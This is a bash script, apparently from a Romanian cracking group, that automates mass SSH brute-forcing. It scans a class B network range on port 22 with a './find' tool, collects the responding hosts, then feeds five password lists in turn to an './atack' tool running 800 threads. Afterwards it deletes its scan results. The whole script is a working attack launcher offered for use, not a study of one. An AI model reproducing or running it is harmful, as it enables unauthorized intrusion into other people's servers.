#!/bin/bash
if [ $# != 1 ]; then
        echo "[+] Folosim : $0 [b class]"
        exit;
fi

echo "[+]       Pirated edition.       [+]"
echo "[+]******************************[+]"
echo "[+]********** Made By Joker *****[+]"
echo "[+]*********In #LinuxCrackers****[+]"
./find $1 22 

sleep 10
cat $1.find.22 |sort |uniq > ip.conf
oopsnr2=`grep -c . ip.conf`
echo "[+] Here we go"
echo "[+] Am gasit  $oopsnr2 de servere."
echo "[+] Let s see what we got"
echo "Checking..."
cp 1 data.conf
echo "Checking 1st pass file"
sleep 3
./atack 800
cp 2 data.conf
echo "Checking 2nd pass file"
sleep 3
./atack 800
cp 3 data.conf
echo "Checking 3rd pass file"
sleep 3
./atack 800
cp 4 data.conf
echo "Checking 4th pass file"
sleep 3
./atack 800
cp 5 data.conf
echo "Cheking 5th pass file"
sleep 3
./atack 800
rm -rf $1.find.22 ip.conf
echo "[+] nothing here"
